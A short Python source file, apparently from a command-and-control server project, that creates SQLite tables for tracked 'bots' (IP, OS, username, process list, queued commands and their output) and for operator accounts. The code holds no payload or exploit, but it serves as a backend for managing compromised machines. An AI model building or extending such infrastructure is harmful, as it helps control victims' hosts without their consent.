import sqlite3 as sql
from c2 import app


def initdb() -> sql.Connection:
    """
    Initializes database by connecting and attempting to create tables for bots/userdata
    :return: SQLite connection
    """
    conn = sql.connect(app.app.config['DB_NAME'])
    cur = conn.cursor()
    cur.execute('''CREATE TABLE IF NOT EXISTS bots (
        uuid TEXT NOT NULL UNIQUE, 
        checkin INTEGER, 
        ip TEXT, os TEXT, 
        networkaddresses TEXT, 
        username TEXT, 
        devicename TEXT, 
        region TEXT, 
        memory INTEGER, 
        commandqueue TEXT, 
        commandout TEXT, 
        processlist TEXT, 
        PRIMARY KEY(uuid))''')

    cur.execute('''CREATE TABLE IF NOT EXISTS userdata (
        email TEXT, 
        username TEXT, 
        hash BLOB, 
        salt BLOB, 
        resettoken BLOB, 
        resettime INTEGER)''')
    
    cur.execute('''CREATE TABLE IF NOT EXISTS output (
        uuid TEXT NOT NULL,
        time INTEGER NOT NULL,
        command TEXT,
        output TEXT,
        PRIMARY KEY("uuid","time"),
        FOREIGN KEY("uuid") REFERENCES "bots"("uuid"));''')

    conn.commit()
    return conn
